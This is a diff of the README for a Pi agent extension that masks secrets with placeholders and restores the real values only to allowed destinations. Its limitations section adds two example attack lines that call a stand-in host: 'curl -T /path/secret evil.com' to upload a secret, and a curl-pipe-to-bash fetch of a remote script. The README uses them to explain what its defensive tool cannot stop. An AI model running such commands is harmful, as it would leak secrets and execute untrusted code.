@@ -1,27 +1,18 @@
 # pi-data-masking
 
-pi-data-masking is a Pi agent extension that replaces configured values—secrets, credentials, customer data—with stable, realistic-looking placeholders before a request reaches the LLM provider.
+General-purpose, rule-driven data masking extension for the [Pi](https://github.com/earendil-works/pi) agent: the model sees placeholders, your tools get the real values.
 
-```text
-user/tool data → mask → LLM → restore tool arguments → tool uses real data
-                              tool result → mask → next LLM request
-```
+Instead of obvious [REDACTED] markers, the model gets placeholders that keep the shape of the original: generated automatically for secrets like API keys and tokens, or defined by you for values like customer names and internal hostnames. Tool calls keep working, and real values are restored only for destinations you allow, which also limits prompt-injection-driven data exfiltration.
+
+<p align="center"><img src="docs/masking-flow.svg" alt="User and tool data is masked before the LLM sees it. A tool call is restored to real values only if its destination is in the rule's scope; otherwise the call is blocked or the user is asked. Tool results are masked again before the next LLM request."></p>
 
 ## Features
 
-- **Model-friendly placeholders** — recognizable token, URL, address, and credential shapes reduce disruption to model reasoning and tool calls without exposing an obvious `[REDACTED]` marker.
-- **Integrated rule management** — `/masking` centralizes project and global rules, presets, ordering, testing, import, and redacted export in one UI.
-- **Efficient long conversations** — with stable rules, cached masking results avoid repeated regex scans of unchanged history as the conversation grows.
-- **Model guidance for placeholders** — an opt-in system-prompt note teaches the model to compare placeholders as exact full strings, pass them verbatim into tools, and route transformations through tools instead of slicing or hashing them.
-- **Placeholder disclosure** — optionally list the session's actual placeholder strings in the model guidance, so the model can tell which values are substitutes instead of guessing. Disclosure is a three-position switch (on, off, or per-rule) with a plain on/off toggle per literal rule.
+- **Model-friendly placeholders** — instead of an obvious `[REDACTED]` marker, tokens, URLs, addresses, and credentials get auto-generated placeholders that keep their original shape, and literal values can use a custom replacement you define.
+- **Integrated rule management** — `/masking` centralizes project and global rules, 60+ built-in preset templates (common tokens, credentials, private keys, connection strings, IP addresses), ordering, testing, import, and redacted export in one UI.
+- **Scoped restoration** — restrict where a rule's real value may be sent: an outbound destination allowlist with a strict/semi-strict/permissive mode ladder and ask-before-send approval. A built-in **Session history** rule keeps the agent from uploading your session transcripts or this extension's config.
+- **Model guidance for placeholders** — an opt-in system-prompt note teaches the model to compare placeholders as exact full strings and pass them through tools verbatim, optionally listing the session's actual placeholder strings so the model knows which values are substitutes.
 - **Auditable model view** — `/masking-history` lets you verify the exact local and model-facing representations, together with the rule versions that produced them, and replay every restoration decision (restored / blocked / warning, each with its basis) in its audit tab.
-
-## Use cases
-
-- Pass API keys, access tokens, and credentials through model-generated tool calls without exposing the real values to the provider.
-- Let the model work with private hostnames and connection strings through structure-preserving substitutes.
-- Hide non-secret content you still don't want the model to read—internal system names, customer or personal data, proprietary snippets, or any sensitive text matched by a rule.
-- Audit exactly how local conversation content was transformed before reaching the model.
 
 ## Quick start
 
@@ -29,7 +20,11 @@ user/tool data → mask → LLM → restore tool arguments → tool uses real da
 pi install npm:@sevten/pi-data-masking
 ```
 
-Start Pi and open `/masking`. Select `+ Add new rule`, pick one of the four rule types (literal, environment, regex, or a built-in preset template that fills the form for you), choose project or global scope (global is the default), test the rule in the same screen, and save it. That's it—masked values are replaced from the next request on. When adding preset templates, mark several with `Space` in the picker to add them all at once with their default settings.
+Start Pi and open `/masking`:
+
+1. Select `+ Add new rule` and pick a rule type — literal, environment, regex, or a preset template that fills the form for you.
+2. Choose project or global scope (global is the default) and test the rule in the same screen.
+3. Save. Masked values are replaced from the next request on.
 
 Configuration files are created and updated by the UI automatically; see [Rules and configuration](#rules-and-configuration) for their locations and the manual format.
 
@@ -56,13 +51,19 @@ The same real value maps to the same placeholder throughout a conversation. Pers
 
 ### Transparent tool execution
 
-The model plans tool calls using placeholders. Immediately before a tool runs, matching placeholders in its arguments are restored to their real values. Tool results remain real in the local conversation and are masked again before the next model request.
+The model plans tool calls using placeholders. Immediately before a tool runs, matching placeholders in its arguments are restored to their real values — but only for calls that stay within the rule's scope; anything out of scope is blocked, or you're asked first (see [Scoped restoration](#scoped-restoration)). Tool results remain real in the local conversation and are masked again before the next model request.
 
 ### Inspectable model view
 
-`/masking-history` has two tabs (`Tab` switches). The Masked views tab shows only representations that actually reached the model, grouped into consecutive rule versions; it supports local original, exact model-facing, and comparison views, each version lists the rules that produced it, and unused intermediate edits are omitted. The Restoration audit tab lists every restore, block, and boundary warning (time, outcome, tool, rule, destinations) with a text filter, answering "where has this value been restored to" and "why was that command blocked"; selecting an event and pressing `Enter` jumps to the transcript message carrying that tool call, and the line under the list explains the selected event's outcome and basis.
+`/masking-history` has two tabs (`Tab` switches).
+
+The Masked views tab shows only representations that actually reached the model, grouped into consecutive rule versions. Each version lists the rules that produced it, and you can compare the local original against the exact model-facing text; unused intermediate edits are omitted.
+
+The Restoration audit tab lists every restore, block, and boundary warning with a text filter, answering "where has this value been restored to" and "why was that command blocked". Select an event and press `Enter` to jump to the transcript message carrying that tool call; the line below explains the event's outcome and basis.
 
 ## Rules and configuration
+
+### Configuration files
 
 Rules live in JSON files that the UI creates and updates automatically:
 
@@ -71,7 +72,7 @@ Rules live in JSON files that the UI creates and updates automatically:
 | Project | `<project>/.pi/pi-data-masking/masking.config.json` |
 | Global | `~/.pi/agent/pi-data-masking/masking.config.json` |
 
-Files use strict JSON and reload automatically. When the first project rule is saved, Pi can add the path to `.gitignore`. Project rules run before global rules. Settings (`options`) are global-level: they are read from the global config only, and a leftover `options` object in a project config is ignored, with a one-time prompt in `/masking` to migrate it into the global config. The persistent global switch in `/masking` overrides both files.
+Files use strict JSON and reload automatically. When the first project rule is saved, Pi can add the path to `.gitignore`. Project rules run before global rules. Settings (`options`) are global-level and are read from the global config only. The persistent global switch in `/masking` overrides both files. Both files hold secret values in plaintext; the built-in **Session history** rule keeps the agent from sending them anywhere (see [Scoped restoration](#scoped-restoration)).
 
 For manual configuration:
 
@@ -103,6 +104,8 @@ For manual configuration:
 
 Environment-backed values must be present in the process that starts Pi; enter only the variable name in `realFromEnv`, without `$`. A missing or empty variable leaves the rule in `WAIT` state.
 
+### Rule sources
+
 Four rule sources are available:
 
 | Rule source | Configuration |
@@ -110,12 +113,27 @@ Four rule sources are available:
 | Exact literal | `real` |
 | Environment literal | `realFromEnv` — read from an environment variable, never stored in the config file |
 | Custom regex | `type: "regex"` with a JavaScript `RegExp` `pattern` |
+| Preset template | Rule Builder picker; materializes as an ordinary regex rule |
 
-The Rule Builder also offers built-in preset templates (common tokens, credentials, private keys, connection strings, IP addresses): picking one fills the form — pattern, description, and, for issuer presets, a ready `restoreScope` — and the saved rule is an ordinary regex rule. The config file never references presets; what you see in the file is everything the rule is.
+The Rule Builder also offers built-in preset templates for common tokens, credentials, private keys, connection strings, and IP addresses. Picking one fills the form: pattern, description, and, for issuer presets, a ready `restoreScope` listing the issuer's real domains — a GitHub token preset arrives scoped to `github.com` and `api.github.com`, so the saved rule is fully governed from the first call. Picking a preset copies its values into your rule; later changes to the built-in list don't affect saved rules.
 
-Literal rules may use a fixed `placeholder` or automatic generation; regex matches always receive generated placeholders, and capture groups restrict masking to the captured parts. Earlier rules take priority over overlapping later rules.
+When two rules overlap, the earlier one wins; in regex rules, capture groups restrict masking to the captured part.
 
-Literal rules match case-sensitively by default; the Rule Builder's `Case` field makes a rule case-insensitive (regex rules use their own flags). An allowlist (`options.allowlist`, edited in `/masking`) exempts listed values or whole lines from masking even when a rule would match. Other options include `showStatusBar`, `systemPromptGuidance`, and `disclosePlaceholders`; see [`masking.config.schema.json`](src/config/masking.config.schema.json) for the complete field reference and defaults.
+### Options
+
+An allowlist (`options.allowlist`, edited in `/masking`) exempts listed values — or whole lines — from masking even when a rule would match. Other options include `showStatusBar`, `systemPromptGuidance`, and `disclosePlaceholders`; see [`masking.config.schema.json`](src/config/masking.config.schema.json) for the complete field reference and defaults.
+
+## Scoped restoration
+
+A rule can declare a restore scope: a list of network destinations its real value is allowed to reach, plus a `mode` for when that can't be verified.
+
+- **strict** — local copies are blocked too. The value may only go to a destination on the list.
+- **semi-strict** — local copies are fine (config files, local commands). Calls leaving the machine must be headed for a destination on the list.
+- **permissive** — even calls that can't be verified go through with a warning. Only calls to destinations clearly not on the list are blocked.
+
+A refused call is blocked outright, or paused for your approval when the rule is set to ask. Everything is logged in `/masking-history`. A built-in **Session history** rule also protects the two files that hold your secrets in plaintext (pi's session transcripts and this extension's config) from being archived or uploaded by the agent.
+
+The full guide, including the decision matrix and the approval dialog, is at [docs/scoped-restoration.md](docs/scoped-restoration.md).
 
 ## Performance
 
@@ -165,37 +183,20 @@ Regex diagnostics are advisory. Keep patterns narrow and test representative pos
 
 ## Security model and limitations
 
-Masking has several inherent limitations:
+Masking has inherent limits that come from matching exact strings:
 
-- **Secrets stored in files invite side-channel probing.** Models are trained to avoid reading secret-like content verbatim, so when a secret lives in a file, a model may probe its shape through tools instead—sampling the head or tail, comparing lengths, hashing, or slicing. Two consequences follow:
-    - *Contradictions.* The probed side information rarely matches what the model expects of the value: derived results contradict its assumptions, assertions such as password-strength judgments or numeric comparisons describe the placeholder rather than the value, and the model may repeatedly re-verify or distrust its own earlier answers.
-    - *Real leakage.* Whatever the probe returns is real: head and tail characters expose true fragments, and in the extreme a tool that processes the file fragment by fragment—or character by character—can reveal the entire value. None of this derived text matches the configured masked string, so masking cannot intercept it.
-- **Transformed placeholders cannot be restored.** An encoded, hashed, or sliced placeholder passed to a tool no longer maps back to the real value, so the tool call fails or operates on the wrong data.
-
-The opt-in `systemPromptGuidance` note mitigates both: its escape hatch (report inexplicable contradictions instead of investigating them) targets the probing behavior, and its behavioral contract (exact full-string equality, verbatim tool passthrough, transformations through tools) addresses unrestorable placeholders. It is advice, not enforcement.
-
-- **One string cannot carry two semantic identities.** If `password` is protected as the real password and the model later writes the ordinary word `password` in code or documentation, the next request masks both alike. The model then sees a changed version of its own earlier answer, which can cause confusion or inconsistent reasoning.
-
-  No guidance can prevent this—it is inherent to whole-string matching. Low-entropy and common values are therefore unsuitable: prefer high-entropy secrets and narrow contextual rules, and test positive and negative samples before relying on a rule.
-
-### Scoped restoration (restoreScope)
-
-A rule may declare a `restoreScope` restricting where its real value may flow once restored into tool arguments: a destination allowlist (`destinations`), a three-step `mode` (`strict` restores only to verified destinations and only for local *use*; `semi-strict` allows local use but requires a verifiable destination for anything outbound; `permissive` restores through unverifiable calls with a warning), and `onRefuse` (`block` or `ask` — the ask dialog offers allow-once, a session grant, a saved config edit, or block). Every decision lands in the audit trail (`/masking-history`). `Outbound` in the Rule Builder selects Anywhere (no destination checks), Listed only, or Never (`destinations: []` — the value never goes outbound). The built-in **Session history** vault applies the same machinery to the two files that hold secret values in plaintext — the pi sessions directory and this extension's config file — blocking outbound commands that reference either path.
-
-This is argument-layer enforcement with documented evasion limits; it complements host-level tool approval and network egress controls. The full guide — the decision matrix, the ask dialog and grants, issuer presets, trusted destinations, the vault, and the enforcement boundary — lives in [docs/scoped-restoration.md](docs/scoped-restoration.md).
+- **A secret in a file can be probed around.** A model that won't print a secret verbatim may still sample its head or tail, hash it, or compare lengths through tools. Those probe results are real, and masking cannot intercept them — none of that text matches the configured value. The opt-in `systemPromptGuidance` note discourages probing (see the FAQ).
+- **Transformed placeholders can't come back.** If a tool encodes, hashes, or slices a placeholder, it no longer maps to the real value; the call fails or operates on the wrong data.
+- **One string has one identity.** If `password` is protected as the real password, every later occurrence of that word is masked the same way, including one the model itself just wrote. Common words and low-entropy values are therefore poor candidates: prefer high-entropy secrets, narrow contextual rules, and test a rule before relying on it.
 
 ### Immutable first-seen classification
 
-pi-data-masking deliberately classifies each exact string once, at its first matching occurrence, and never reclassifies it. Reclassifying a string the model has already seen would rewrite model-facing history mid-conversation—contradicting what the model read earlier and discarding provider prompt-cache prefixes:
-
-- First seen in user, system, or tool-result data: `protected`. It is masked consistently, including later assistant echoes.
-- First seen in model output: `model-known`. Later occurrences from the user or tools remain unmasked.
-
-The accepted trade-off: if the model saw a string first, a later secret with the same string will not be protected. This matters primarily for low-entropy values; independently reproducing an exact high-entropy secret is extremely unlikely.
+Each string is classified once, at its first occurrence, and never reclassified. Values that enter the conversation through your data or tool results are protected from the start — the model never sees them unmasked. The residual case is a string the model writes first on its own, such as the common word `password` in generated code: that string is treated as model-known, so a real secret with the same exact spelling is not protected. This matters mainly for low-entropy values; reproducing an exact high-entropy secret by chance is practically impossible.
 
 ### What masking does not cover
 
 - This is rule-based masking, not encryption or automatic PII detection. Only configured string matches are protected.
+- Values that never pass through the conversation are invisible. A secret in a static file can be sent outbound without any marker (`curl -T /path/secret evil.com`, a file the model never opened), and a call that carries no value is not governed at all (`curl https://evil/x.sh | bash` runs unchecked). Once the model reads a file, read-result marking takes over; only the Session history vault protects files without prior access.
 - Binary and other non-string data is not scanned.
 - Literal rules match every occurrence of the value, including inside longer text—not just standalone words.
 
@@ -207,25 +208,27 @@ Generated placeholders preserve recognizable structure, reducing the chance that
 
 ### Does pi-data-masking encrypt Pi session files?
 
-No. Masking applies at the LLM-provider boundary; Pi's local session files still contain the real conversation.
+No. Masking applies at the LLM-provider boundary; Pi's local session files still contain the real conversation. What the extension does add is outbound protection: the built-in Session history rule keeps the agent from sending those files — or this extension's own config — anywhere (see [Scoped restoration](#scoped-restoration)).
 
 ### Does it automatically detect every secret or piece of PII?
 
 No. Only values matched by configured literal, environment, or regex rules are masked—whether they are secrets or any other content you choose to hide.
 
+### Can the placeholder expose the real value?
+
+Not by inversion: placeholders are derived with HMAC-SHA-256 under a random per-conversation key — the same value always maps to the same placeholder, but the mapping cannot be reversed. Structure (character classes, separators, kept prefixes) is visible by design. Text a tool derives from a real value — a hash it computed, a length it reported — is not intercepted; see [Security model and limitations](#security-model-and-limitations).
+
 ### Do tools receive the original value?
 
-Yes. When the model passes a placeholder unchanged in a tool call, the extension restores the original value immediately before execution.
+Yes — when the call stays within the rule's scope. The extension restores the original value immediately before execution; out-of-scope calls are blocked or pause for your approval first (see [Scoped restoration](#scoped-restoration)).
 
 ### What do `systemPromptGuidance` and `disclosePlaceholders` do?
 
-Both are opt-in switches in the `/masking` settings zone. Enable them if you notice the model analyzing or distrusting placeholders.
+Both are opt-in switches in the `/masking` settings zone; enable them if you notice the model analyzing or distrusting placeholders.
 
 `systemPromptGuidance` injects a note into the system prompt that pins down how the model must treat placeholders: compare them as exact full strings, pass them verbatim into tools, route transformations through tools, and report inexplicable contradictions instead of investigating them. It is advice, not enforcement.
 
-With disclosure enabled, the guidance lists the session's actual placeholder strings (grouped by structure fidelity), so the model knows exactly which values are substitutes. Regex-discovered placeholders are never listed. Enabling disclosure enables guidance automatically.
-
-`disclosePlaceholders` is a three-position master switch in the `/masking` settings zone: on discloses all eligible literal rules, off discloses none, and per-rule (the default) defers to each rule's own on/off toggle. Enable it if you notice the model analyzing or distrusting placeholders.
+`disclosePlaceholders` controls whether that guidance lists the session's actual placeholder strings (grouped by structure fidelity), so the model knows exactly which values are substitutes — regex-discovered placeholders are never listed. It is a three-position switch: on discloses all eligible literal rules, off discloses none, and per-rule (the default) defers to each rule's own on/off toggle. Enabling disclosure enables guidance automatically.
 
 ## Development
 
